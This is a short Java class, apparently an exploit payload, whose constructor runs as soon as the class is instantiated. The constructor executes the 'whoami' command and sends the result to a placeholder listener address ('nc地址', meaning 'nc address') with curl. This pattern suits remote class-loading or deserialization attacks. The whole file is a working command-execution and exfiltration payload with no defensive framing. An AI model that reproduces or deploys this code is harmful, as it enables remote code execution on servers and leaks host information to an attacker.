import java.io.InputStreamReader;
import java.io.LineNumberReader;

public class CommandExec {

    public CommandExec() {
        System.out.println("CommandExec Called!");
        try {
            String cmd = "whoami";
            String result = "";
            Process process = Runtime.getRuntime().exec(cmd);
            // 获得标准流上的输出
            InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream());
            LineNumberReader consoleInput = new LineNumberReader(inputStreamReader);
            String consoleInputLine;
            while ((consoleInputLine = consoleInput.readLine()) != null) {
                result += consoleInputLine;
            }
            java.lang.Runtime.getRuntime().exec("curl http://nc地址/" + result);
        } catch (Exception e) {
            System.out.println("Command Exec Failed!");
        }
    }
}
